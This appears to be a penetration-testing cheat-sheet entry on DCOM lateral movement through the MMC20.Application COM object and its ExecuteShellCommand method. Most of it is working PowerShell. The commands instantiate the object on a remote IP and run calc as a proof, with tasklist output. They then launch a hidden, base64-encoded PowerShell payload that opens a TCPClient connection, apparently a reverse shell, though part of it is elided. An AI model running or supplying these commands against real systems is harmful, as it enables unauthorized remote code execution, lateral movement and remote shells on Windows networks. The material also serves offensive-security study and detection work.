# DCOM

The Microsoft Component Object Model (COM)3 is a system for creating software components that interact with each other. While COM was created for either same-process or cross-process interaction, it was extended to Distributed Component Object Model (DCOM) for interaction between multiple computers over a network.

The discovered DCOM lateral movement technique is based on the **Microsoft Management Console (MMC**) COM application that is employed for scripted automation of Windows systems.

The MMC Application Class allows the creation of Application Objects, which expose the **ExecuteShellCommand** method under the **Document.ActiveView** property. As its name suggests, this method allows execution of any shell command as long as the authenticated user is authorized, which is the default for local administrators.

#### Commands <a href="#commands" id="commands"></a>

```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))


$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")


C:\Users\Administrator>tasklist | findstr "calc"
win32calc.exe                 4764 Services                   0     12,132 K



$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
```
